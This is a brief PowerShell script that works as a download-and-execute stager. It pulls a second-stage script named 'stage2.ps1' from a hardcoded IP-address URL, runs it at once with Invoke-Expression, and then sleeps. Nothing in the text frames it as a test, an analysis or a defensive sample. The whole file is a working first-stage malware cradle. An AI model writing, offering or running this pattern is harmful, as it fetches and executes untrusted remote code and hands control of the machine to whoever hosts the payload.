
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://192.0.2.137:443/stage2.ps1',
    [int]$TransferTimeout = 39
)
IEX (Invoke-WebRequest -Uri $TransferUrl -UseBasicParsing).Content
Start-Sleep -Seconds 21
